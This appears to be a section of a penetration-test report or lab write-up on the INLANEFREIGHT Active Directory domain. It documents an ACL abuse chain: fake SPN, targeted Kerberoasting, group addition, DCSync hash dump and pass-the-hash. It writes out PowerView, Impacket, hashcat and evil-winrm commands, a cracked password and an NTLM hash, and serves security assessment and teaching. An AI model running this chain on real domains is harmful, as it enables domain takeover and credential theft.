#### Active Directory Compromise — DCSync via Targeted Kerberoasting

*Starting credentials: `INLANEFREIGHT\mssqladm` / `DBAilfreight1!`.*

---

#### Finding: Excessive GenericWrite Rights → Targeted Kerberoasting

BloodHound analysis of `mssqladm`'s effective rights showed **GenericWrite over the `ttimmons` user**. This can be abused to force a fake Service Principal Name (SPN) onto the target account, converting it into a Kerberoastable target regardless of whether it was one previously.

![[Pasted image 20260711052432.png]]

Using a PowerView `PSCredential` object for `mssqladm` (built on DEV01), a fake SPN was set on `ttimmons`:

```powershell
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\mssqladm', $SecPassword)
Set-DomainObject -Credential $Cred -Identity ttimmons -SET @{serviceprincipalname='acmetesting/LEGIT'} -Verbose
```

*(This change was noted for removal and reporting in the engagement's appendix of configuration changes.)* Impacket's `GetUserSPNs.py` was then used from the attack host to request and crack the resulting service ticket:

```
python3 GetUserSPNs.py -dc-ip 172.16.8.3 INLANEFREIGHT.LOCAL/mssqladm -request-user ttimmons
...
hashcat -m 13100 ttimmons_tgs /usr/share/wordlists/rockyou.txt
...
$krb5tgs$23$*ttimmons$...:Repeat09
```

The ticket cracked immediately, yielding a weak password: **`ttimmons` / `Repeat09`**.

**Finding: GenericWrite Permission Abuse Enabling Targeted Kerberoasting — High.** Full command output and hash material: `Evidence/Scans/AD Enumeration/AD_Enumeration_evidence.md`.

---

#### Finding: GenericAll over Server Admins → DCSync → Full Domain Compromise

BloodHound further showed `ttimmons` held **GenericAll over the "Server Admins" group**, which in turn holds **DCSync rights** on the domain — i.e., the ability to replicate directory data (including password hashes) from a Domain Controller as if it were a peer DC.

![[Pasted image 20260711052748.png]]
![[Pasted image 20260711052807.png]]

`ttimmons` was added to the Server Admins group using its own delegated rights:

```powershell
$group = Convert-NameToSid "Server Admins"
Add-DomainGroupMember -Identity $group -Members 'ttimmons' -Credential $timcreds -Verbose
```

With inherited DCSync rights, a full NTLM hash dump of the domain was performed:

```
secretsdump.py ttimmons@172.16.8.3 -just-dc-ntlm
...
Administrator:500:...:fd1f7e5564060258ea787ddbb6e6afa2:::
krbtgt:502:...
inlanefreight.local\avazquez:1716:... [+ 16 further domain accounts]
```

The recovered Administrator hash was validated directly against the Domain Controller via pass-the-hash (Evil-WinRM), confirming full domain compromise:

```
evil-winrm -i 172.16.8.3 -u Administrator -H 'fd1f7e5564060258ea787ddbb6e6afa2'
```

**Finding: DCSync Rights Obtainable via Delegated Group Membership — Critical.** This represents full compromise of the `INLANEFREIGHT.LOCAL` domain, achieved through a chain of over-permissioned ACLs (GenericWrite → targeted Kerberoasting → GenericAll on a DCSync-capable group) rather than any single software vulnerability. Full NTDS dump: `Evidence/Scans/AD Enumeration/AD_Enumeration_evidence.md`.

---

#### Recommended Follow-On Activity (Documented for the Client)

Per the engagement's Rules of Engagement, the following additional value-add activities are appropriate once Domain Admin is achieved and should be scoped/confirmed with the client before proceeding:

- Full NTDS.dit extraction and offline password-strength analysis (e.g., with DPAT), reported as aggregate statistics (hashes obtained/cracked, top passwords, password length distribution, privileged-account crack rate).
- An Active Directory configuration/hygiene audit (e.g., with PingCastle) to supplement exploitation findings with hardening recommendations.
- Screenshot-based proof of Domain Controller access (e.g., `hostname`, `whoami`, `ipconfig /all` via RDP) as a clear, non-technical visual for the report.
- With client sign-off, a detection test: create or add a controlled account to Domain Admins/Enterprise Admins and observe whether the client's monitoring detects and remediates it — reported as a positive finding if so.

---

*Continued in Post-Exploitation — pillaging with Domain Admin rights, double-pivot to the restricted management network, and closing recommendations.*
